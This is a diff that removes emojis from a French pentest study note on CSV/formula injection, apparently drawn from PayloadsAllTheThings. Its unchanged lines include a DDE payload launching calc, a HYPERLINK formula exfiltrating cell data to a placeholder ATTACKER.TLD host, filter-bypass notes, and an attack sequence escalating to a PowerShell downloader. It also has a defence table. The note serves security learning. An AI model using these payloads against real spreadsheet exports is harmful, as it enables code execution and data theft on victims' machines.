@@ -12,7 +12,7 @@ statut: publie
 
 
 
-# 📊 CSV Injection — Formula Injection
+# CSV Injection — Formula Injection
 
 > [!info] **En 1 phrase**
 > CSV Injection (Formula Injection) = injecter une **formule** préfixée par `=`, `+`, `-` ou `@`
@@ -23,7 +23,7 @@ statut: publie
 
 ---
 
-## 🎯 Concept
+## Concept
 
 ```mermaid
 flowchart LR
@@ -35,14 +35,14 @@ flowchart LR
     D --> G[RCE / malware<br>sur la machine]
 ```
 
-> [!info] 💡 **Pourquoi ça marche**
+> [!info] **Pourquoi ça marche**
 > Le tableur interprète **automatiquement** comme une formule toute cellule qui commence par
 > `=`, `+`, `-` ou `@`. Si l'export ne les échappe pas, le contenu utilisateur devient du code
 > exécuté à l'ouverture du fichier.
 
 ---
 
-## 🕵️ Détection
+## Détection
 
 > Tout champ renvoyé dans un export **CSV** (mais aussi TSV, XLSX, ODS…) et contrôlable par
 > l'utilisateur est un point d'injection potentiel : nom d'utilisateur, email, commentaire,
@@ -65,12 +65,12 @@ nom, =2+2
 → à l'ouverture, la cellule affiche "4" = vulnérable
 ```
 
-> [!tip] 💡 **Test blind** : utiliser `=cmd|'/C calc'!A0` (DDE). Si une popup DDE ou la
+> [!tip] **Test blind** : utiliser `=cmd|'/C calc'!A0` (DDE). Si une popup DDE ou la
 > calculatrice s'ouvre, l'injection est confirmée.
 
 ---
 
-## 🧨 Payloads de formule (hors DDE)
+## Payloads de formule (hors DDE)
 
 Formules standard qui contactent un serveur ou déclenchent des actions au chargement :
 
@@ -86,7 +86,7 @@ et dans Google Sheets les fonctions `IMPORT*` (voir Exfiltration).
 
 ---
 
-## 📟 Attaques DDE (Dynamic Data Exchange)
+## Attaques DDE (Dynamic Data Exchange)
 
 > DDE permet à une cellule de dialoguer avec un autre programme (dont `cmd.exe`). **Fermé par
 > défaut dans Excel récent**, mais souvent accepté dans LibreOffice / Excel avec confirmation.
@@ -138,7 +138,7 @@ DDE ("cmd";"/C calc";"!A0")A0
 
 ---
 
-## 🪝 Bypass des filtres
+## Bypass des filtres
 
 | Filtre courant | Contournement |
 |---|---|
@@ -150,7 +150,7 @@ DDE ("cmd";"/C calc";"!A0")A0
 
 ---
 
-## 📤 Exfiltration
+## Exfiltration
 
 ### Google Sheets
 
@@ -176,13 +176,13 @@ Test **blind / exfiltration** :
 =HYPERLINK("http://ATTACKER.TLD/?d="&B2,"x")
 ```
 
-> [!warning] ⚠️ **Limite** : les valeurs exfiltrées le sont via les cellules du **même fichier**.
+> [!warning] **Limite** : les valeurs exfiltrées le sont via les cellules du **même fichier**.
 > Pour extraire des données sensibles, il faut souvent croiser deux exports (créer une cellule
 > contenant les données, puis la référencer dans la formule).
 
 ---
 
-## 🗂️ Versions
+## Versions
 
 | Logiciel | Comportement |
 |---|---|
@@ -194,7 +194,7 @@ Test **blind / exfiltration** :
 
 ---
 
-## 🔍 Détection & Défense
+## Détection & Défense
 
 | Réponse | Détail |
 |---|---|
@@ -207,14 +207,14 @@ Test **blind / exfiltration** :
 
 ---
 
-## ⚠️ Tips & Pièges
+## Tips & Pièges
 
-> [!tip] 💡 **Ordre logique d'attaque**
+> [!tip] **Ordre logique d'attaque**
 > 1. Trouver un champ reflété dans un export CSV → 2. Tester `=2+2` (calcul ?) →
 > 3. Confirmer avec un payload DDE `=cmd|'/C calc'!A0` → 4. Upgrade vers un downloader PowerShell
 > ou une exfiltration `IMPORT*` / `HYPERLINK`.
 
-> [!warning] ⚠️ **Pièges**
+> [!warning] **Pièges**
 > - Le fichier CSV est ouvert par la **victime** : la commande s'exécute sur sa machine, pas sur le serveur.
 > - Excel moderne **bloque DDE** par défaut → tester aussi sur LibreOffice et vérifier les versions.
 > - Une popup de sécurité (DDE / macros) peut apparaître : prévoir un payload silencieux.
@@ -224,9 +224,9 @@ Test **blind / exfiltration** :
 
 ---
 
-## 🔗 Liens
+## Liens
 
-- [[XSS (Cross-Site Scripting)|🖼️ XSS]]
-- [[Injection de commandes|🐚 Injection de commandes]]
-- → Note complète : [[03 - Exploitation Web|🌍 Exploitation Web]]
-- 📚 Source : [PayloadsAllTheThings — CSV Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CSV%20Injection/README.md)
+- [[XSS (Cross-Site Scripting)| XSS]]
+- [[Injection de commandes| Injection de commandes]]
+- → Note complète : [[03 - Exploitation Web| Exploitation Web]]
+- Source : [PayloadsAllTheThings — CSV Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CSV%20Injection/README.md)
